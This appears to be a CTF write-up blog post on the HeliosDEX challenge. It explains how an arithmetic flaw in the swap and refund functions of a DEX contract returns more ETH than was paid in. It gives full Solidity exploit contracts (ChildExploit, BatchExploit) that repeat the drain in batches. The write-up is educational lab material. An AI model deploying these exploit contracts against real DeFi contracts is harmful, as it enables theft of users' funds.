---
layout: post
title: "HeliosDEX"
date: 2025-03-28
categories: CTF/CyberApocalypse2025
---

# Exploiting an Arithmetic Vulnerability in HeliosDEX

## Establishing a Connection with the Provided RPC

The challenge environment exposes a blockchain node at an IP/port pair, but offers little direct guidance on how to connect.
 
![HTB](https://raw.githubusercontent.com/gnarizard/cyberjutsu/refs/heads/master/_posts/CTF/CyberApocalypse2025/HTB.png)

One approach is to verify the node’s availability by using netcat (or another banner‑grabbing method) to confirm that a service is listening.

![NC](https://raw.githubusercontent.com/gnarizard/cyberjutsu/refs/heads/master/_posts/CTF/CyberApocalypse2025/NC.png) 

After confirming the node is running, the private key provided in the challenge can be imported into a local wallet or IDE. For example, in MetaMask, select **Import account**, then paste in the provided private key. 

![Add Account](https://raw.githubusercontent.com/gnarizard/cyberjutsu/refs/heads/master/_posts/CTF/CyberApocalypse2025/AddAccount.png)

Next, add a **Custom RPC Network** in MetaMask (or an equivalent setting in Remix), specifying the challenge’s IP address and port as the **RPC URL**, along with the given chain ID and a suitable network name (such as “HTB-CTF”). 

![Add Network](https://raw.githubusercontent.com/gnarizard/cyberjutsu/refs/heads/master/_posts/CTF/CyberApocalypse2025/AddNetwork.png) 

![Custom RPC](https://raw.githubusercontent.com/gnarizard/cyberjutsu/refs/heads/master/_posts/CTF/CyberApocalypse2025/CustomRPC.png) 

The screenshots (shown previously) illustrate how to input the network name, RPC URL, chain ID, and currency symbol in MetaMask. Once saved, the wallet will display the account’s balance and allow contract interactions on the custom chain.

With this setup, transactions can be deployed or signed through the imported private key on the HTB environment, enabling further interaction with contracts—such as the HeliosDEX challenge contracts—directly from Remix or another web3-compatible interface.

## Vulnerability Overview

The HeliosDEX contract contained an arithmetic vulnerability in its token exchange and refund calculations. An arithmetic vulnerability occurs when the math operations in a contract do not yield the intended result—often because of rounding issues, imprecise order of operations, or other calculation errors.

This flaw caused the conversion and refund formulas to produce a net gain of ETH on every complete swap/refund cycle. Specifically, when ETH was swapped for HeliosLuminaShards (HLS) and then refunded via the `oneTimeRefund` function, the miscalculation in the arithmetic resulted in a refund that exceeded the initial contribution.

## Key Functions in HeliosDEX

Three functions in the HeliosDEX contract are critical to understanding the vulnerability:

- **`swapForHLS()`**  
  Accepts ETH and exchanges it for HLS tokens. Due to the arithmetic error, the conversion process results in acquiring more HLS tokens than intended.

- **`oneTimeRefund(address item, uint256 amount)`**  
  Intended to refund ETH in exchange for tokens, this function calculates the refund amount using the same flawed arithmetic, which leads to an ETH refund greater than the original amount of ETH spent.

- **`heliosLuminaShards()`**  
  Returns the address of the HLS token, allowing external contracts to interact with the token (e.g., checking balances or setting allowances).

## Exploit Mechanism

The vulnerability is exploited by executing a complete cycle that includes swapping ETH for HLS and then refunding HLS for ETH. The following steps summarize the process:

1. **Swap ETH for HLS:**  
   A predetermined amount of ETH is sent to the `swapForHLS()` function. Due to the arithmetic flaw, the conversion yields a larger amount of HLS tokens than would be expected.

2. **Approve Token Spending:**  
   The address of the HLS token is retrieved via `heliosLuminaShards()`, and the contract sets an allowance for HeliosDEX to transfer the HLS tokens.

3. **Trigger the Refund:**  
   The entire HLS balance is sent back to the Dex through the `oneTimeRefund()` function. Because of the arithmetic miscalculation, the ETH refunded exceeds the original amount of ETH, creating a net profit.

4. **Forward the Profit:**  
   The excess ETH obtained from the refund is immediately forwarded to the transaction origin, ensuring that the profit is received by the intended externally owned account.

## Exploit Contracts

Two contracts were developed to implement the exploit:

### ChildExploit

The **ChildExploit** contract is designed to perform a single swap/refund cycle. When deployed with a specified amount of ETH (for example, 1,000,000 wei), it carries out the following actions:

- Calls `swapForHLS()` to convert the provided ETH into HLS tokens.
- Retrieves the HLS token address and sets an allowance for HeliosDEX.
- Calls `oneTimeRefund()` using the entire HLS balance.
- Forwards any refunded ETH to `tx.origin`.

The complete code for ChildExploit is as follows:

```solidity

/* ========== ChildExploit Contract ========== */
/**
 * @notice When deployed with a specified amount of ETH (e.g. 1,000,000 wei),
 * the contract swaps that ETH for HLS, approves the Dex to spend the tokens,
 * triggers a refund via oneTimeRefund, and then forwards any resulting ETH
 * to tx.origin.
 */
contract ChildExploit {
    constructor(address _dex) payable {
        IHeliosDEX dex = IHeliosDEX(_dex);
        
        // 1) Swap all ETH for HLS.
        dex.swapForHLS{value: address(this).balance}();

        // 2) Approve the Dex to spend the HLS tokens.
        address hls = dex.heliosLuminaShards();
        IERC20(hls).approve(_dex, type(uint256).max);

        // 3) Refund the entire HLS balance.
        uint256 hlsBalance = IERC20(hls).balanceOf(address(this));
        dex.oneTimeRefund(hls, hlsBalance);

        // 4) Forward any resulting ETH to tx.origin.
        uint256 leftover = address(this).balance;
        if (leftover > 0) {
            (bool ok, ) = tx.origin.call{value: leftover}("");
            require(ok, "ChildExploit: ETH forwarding failed");
        }
    }
    
    receive() external payable {}
}
```

### BatchExploit

The **BatchExploit** contract facilitates the deployment of multiple ChildExploit contracts in a single transaction. By providing parameters such as the ETH amount to send per ChildExploit (e.g., 1,000,000 wei) and the number of contracts to deploy (batch size), this contract automates the exploitation process. Leftover ETH that is insufficient to fund another ChildExploit is returned to the owner.

The BatchExploit contract code is as follows:

```solidity
/* ========== BatchExploit Contract ========== */
/**
 * @notice Deploy this contract with the Dex address.
 * Then, call deployBatch() with the desired parameters:
 *
 *    - ethPerContract: The amount of ETH (in wei) to send to each ChildExploit (e.g. 1,000,000 wei).
 *    - batchSize: The number of ChildExploit contracts to deploy in one transaction.
 *
 * Each ChildExploit instance executes its refund cycle and forwards the resulting ETH to tx.origin.
 * Any leftover ETH is returned to the contract owner.
 */
contract BatchExploit {
    address public owner;
    address public dex;

    constructor(address _dex) {
        owner = msg.sender;
        dex = _dex;
    }

    /**
     * @notice Deploys up to `batchSize` ChildExploit contracts, each receiving `ethPerContract` wei.
     * Leftover ETH that is insufficient for another deployment is refunded to the owner.
     */
    function deployBatch(uint256 ethPerContract, uint256 batchSize) external payable {
        require(msg.sender == owner, "Only owner");
        require(ethPerContract > 0, "ethPerContract must be > 0");
        require(batchSize > 0, "batchSize must be > 0");

        uint256 available = msg.value;

        // Deploy ChildExploit contracts as long as there is enough ETH.
        for (uint256 i = 0; i < batchSize && available >= ethPerContract; i++) {
            new ChildExploit{value: ethPerContract}(dex);
            available -= ethPerContract;
        }

        // Refund any leftover ETH to the owner.
        if (available > 0) {
            (bool sent, ) = payable(owner).call{value: available}("");
            require(sent, "Refund of leftover ETH failed");
        }
    }

    receive() external payable {}
}
```

## Exploitation Process

The process to extract a net gain of ETH from HeliosDEX using these contracts is as follows:

1. **Initial Testing:**  
   Deploy the ChildExploit contract with a specific amount of ETH (e.g., 1,000,000 wei) and verify that it consistently returns a profit (approximately 0.1 ETH) to the transaction origin.

2. **Batch Deployment:**  
   Deploy the BatchExploit contract by providing the HeliosDEX address. Then, call the `deployBatch()` function with parameters such as `ethPerContract = 1,000,000 wei` and `batchSize = 10`. A total of 10 ChildExploit contracts will be deployed in a single batch, each performing the swap/refund cycle.

3. **Iterative Execution:**  
   Repeat calling `deployBatch()` with the appropriate parameters until the externally owned account receives a sufficient net gain (for example, accumulating a balance of 20 ETH). Although full automation was attempted on the contract level, gas limitations necessitated manual or scripted repeated calls.

## Source Code

[https://github.com/gnarizard/CyberApocalypse2025/tree/main/HeliosDex](https://github.com/gnarizard/CyberApocalypse2025/tree/main/HeliosDex)
